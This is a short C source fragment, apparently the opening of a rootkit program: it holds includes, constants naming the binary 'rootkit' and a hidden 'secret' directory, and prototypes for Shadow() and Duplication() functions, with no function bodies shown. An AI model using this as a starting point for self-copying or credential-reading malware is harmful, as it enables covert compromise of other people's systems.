#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>

#define SUCCES 0
#define FAILED 1
#define MAX_COMMAND 256
#define MAX_DUPLICATE 16384
#define BIN_NAME "rootkit"
#define BIN_DIR "/home/aiden/Documents/Rootkits/secret"

int Shadow();
int Duplication(const char* src, const char* dest);
